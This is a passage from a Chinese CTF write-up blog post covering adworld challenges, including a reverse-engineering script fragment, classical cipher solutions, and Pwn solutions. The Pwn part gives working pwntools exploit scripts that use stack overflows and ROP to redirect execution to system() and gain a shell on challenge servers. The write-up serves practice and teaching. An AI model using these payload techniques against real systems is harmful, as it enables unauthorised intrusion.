class="hljs-number">34</span>, <span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(v13[i : i + <span class="hljs-number">2</span>], <span class="hljs-number">16</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment"># CrackMeJustForFun</span><br></code></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p><img src="/posts/df9d333d/image-20240320225318482.png" srcset="/img/loading.gif" lazyload alt="image-20240320225318482"></p><p>于是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>, <span class="hljs-number">62725</span>)<br><span class="hljs-comment"># p.recvline()</span><br>p.recvuntil(<span class="hljs-string">b&quot;lets get helloworld for bof\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">4</span> + p64(<span class="hljs-number">1853186401</span>))<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>read栈溢出</p><p><img src="/posts/df9d333d/image-20240320234131437.png" srcset="/img/loading.gif" lazyload alt="image-20240320234131437"></p><p>pwndbg调试</p><p><img src="/posts/df9d333d/image-20240320233805057.png" srcset="/img/loading.gif" lazyload alt="image-20240320233805057"></p><p>跳到输入点</p><p><img src="/posts/df9d333d/image-20240320233857781.png" srcset="/img/loading.gif" lazyload alt="image-20240320233857781"></p><p><img src="/posts/df9d333d/image-20240320233928801.png" srcset="/img/loading.gif" lazyload alt="image-20240320233928801"></p><p>得到</p><p><img src="/posts/df9d333d/image-20240320233947193.png" srcset="/img/loading.gif" lazyload alt="image-20240320233947193"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>, <span class="hljs-number">52815</span>)<br><span class="hljs-comment"># p = process(&quot;./level0&quot;)</span><br>p.recvuntil(<span class="hljs-string">b&quot;Hello, World\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * (<span class="hljs-number">136</span>) + p64(<span class="hljs-number">0x4005F4</span>) + p64(<span class="hljs-number">0x400596</span>)) <span class="hljs-comment"># 136 + ret_addr + systemcall_addr</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>查找字符串表有 <code>/bin/su</code>，以及根据提示是 ROP</p><p><img src="/posts/df9d333d/image-20240321174408428.png" srcset="/img/loading.gif" lazyload alt="image-20240321174408428"></p><p><code>0x88 + 0x04</code> 覆盖掉，并用 system 的地址替换本来的返回地址</p><p><img src="/posts/df9d333d/image-20240321174503049.png" srcset="/img/loading.gif" lazyload alt="image-20240321174503049"></p><p>system 的返回用任意4字符覆盖，最后拼接 <code>/bin/su</code> 的地址</p><p><img src="/posts/df9d333d/image-20240321174617903.png" srcset="/img/loading.gif" lazyload alt="image-20240321174617903"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;i386&quot;</span><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>, <span class="hljs-number">56419</span>)<br><span class="hljs-comment"># p = process(&quot;./level2&quot;)</span><br>p.recvuntil(<span class="hljs-string">b&quot;Input:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * (<span class="hljs-number">0x88</span> + <span class="hljs-number">0x04</span>) + p32(<span class="hljs-number">0x8048320</span>) + <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">4</span> + p32(<span class="hljs-number">0x0804A024</span>))<br><span class="hljs-comment"># p.sendline(b&quot;ls&quot;)</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><blockquote><p>元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。<br>你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。</p></blockquote><p>如题名</p><p><img src="/posts/df9d333d/image-20240322191917870.png" srcset="/img/loading.gif" lazyload alt="image-20240322191917870"></p><h2 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h2><blockquote><p>你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了</p></blockquote><p><code>oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;</code></p><p>如题名</p><p><img src="/posts/df9d333d/image-20240322192041263.png" srcset="/img/loading.gif" lazyload alt="image-20240322192041263"></p><h2 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h2><blockquote><p>小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)</p></blockquote><p><code>11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110</code></p><p>如题名</p><p><img src="/posts/df9d333d/image-20240322192148888.png" srcset="/img/loading.gif" lazyload alt="image-20240322192148888"></p><h2 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h2><blockquote><p>被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。</p></blockquote><p><code>ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g</code></p><p>如题名</p><p><img src="/posts/df9d333d/image-20240322192321613.png" srcset="/img/loading.gif" lazyload alt="image-20240322192321613"></p><h2 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h2><blockquote><p>“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Morse">--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-<br></code></pre></td></tr></table></figure><p>摩斯密码解密得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 培根密码">MAY_BE_HAVE_ANOTHER_DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA<br></code></pre></td></tr></table></figure><p><img src="/posts/df9d333d/image-20240322192612476.png" srcset="/img/loading.gif" lazyload alt="image-20240322192612476"></p><p>cyberpeace{} 包裹得 flag</p></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/CTF/" class="category-chain-item">CTF</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/CTF/" class="print-no-link">#CTF</a></div></div><div class="license-box my-3"><div class="license-title"><div>adworld</div><div>https://fanllspd.com/posts/df9d333d/</div></div><div class="license-meta"><div class="license-meta-item"><div>作者</div><div>Fanllspd</div></div><div class="license-meta-item license-meta-date"><div>发布于</div><div>2024年3月19日</div></div><div class="license-meta-item license-meta-date"><div>更新于</div><div>2024年3月22日</div></div><div class="license-meta-item"><div>许可协议</div><div><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/"><span class="hint--top hint--rounded" aria-label="BY - 署名"><i class="iconfont icon-by"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/posts/c220aa1/" title="My-First-Penetration"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">My-First-Penetration</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/posts/14e77824/" title="qsnctf-2024#Round1"><span class="hidden-mobile">qsnctf-2024#Round1</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id="comments" lazyload><div id="waline"></div><script type="text/javascript">Fluid.utils.loadComments("#waline",(function(){Fluid.utils.createCssLink("https://cdn.staticfile.org/waline/2.15.5/waline.min.css"),Fluid.utils.createScript("https://cdn.staticfile.org/waline/2.15.5/waline.min.js",(function(){var e=Object.assign({serverURL:"https://waline-comments-blue.vercel.app/",locale:{placeholder:"Share something plz~~"},avatar:"robohash",path:"window.location.pathname",meta:["nick","mail","link"],requiredMeta:["nick"],lang:"zh-CN",emoji:["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],dark:'html[data-user-color-scheme="dark"]',wordLimit:0,pageSize:10,reaction:!0},{el:"#waline",path:window.location.pathname});Waline.init(e),fetch("https://api.xygeng.cn/One").then(e=>e.json()).then(e=>{document.getElementById("wl-edit").placeholder=`${e.data.content}--${e.data.origin}`}).catch(console.error),Fluid.utils.waitElementVisible("#waline .vcontent",()=>{var e="#waline .vcontent img:not(.vemoji)";Fluid.plugins.imageCaption(e),Fluid.plugins.fancyBox(e)})}))}))</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>目录</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">总访问量 <span id="busuanzi_value_site_pv"></span> 次 </span><span id="busuanzi_container_site_uv" style="display:none">总访客数 <span id="busuanzi_value_site_uv"></span> 人</span></div></div></footer><script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({easing:"ease",speed:500,showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js"></script><script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script><script>!function(t,e){var i=Fluid.plugins.typing,n=e.getElementById("subtitle");n&&i&&i(n.getAttribute("data-typed-text"))}(window,document)</script><script src="/js/img-lazyload.js"></script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js",(function(){var t=jQuery("#toc");if(0!==t.length&&window.tocbot){var i=jQuery("#board-ctn").offset().top;window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-i},CONFIG.toc)),t.find(".toc-list-item").length>0&&t.css("visibility","visible"),Fluid.events.registerRefreshCallback((function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;t.find(".toc-list-item").length>0&&t.css("visibility","visible")}}))}}))</script><script src="https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript("https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js",(function(){window.anchors.options={placement:CONFIG.anchorjs.placement,visible:CONFIG.anchorjs.visible},CONFIG.anchorjs.icon&&(window.anchors.options.icon=CONFIG.anchorjs.icon);var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(window.anchors.options.class="anchorjs-link-left"),window.anchors.add(o.join(", ")),Fluid.events.registerRefreshCallback((function(){if("anchors"in window){anchors.removeAll();var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(anchors.options.class="anchorjs-link-left"),anchors.add(o.join(", "))}}))}))</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",(function(){Fluid.plugins.fancyBox()}))</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/yinghua.js"></script><script src="/js/BgLine.js"></script><script src="/js/walinePlaceHolder.js"></script><script src="/js/scrollAnimation.js"></script><script src="/js/backgroundize.js"></script><script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div></noscript><script>var endLoading=function(){document.body.style.overflow="auto",document.getElementById("loading-box").classList.add("loaded")};window.addEventListener("load",endLoading)</script></body></html>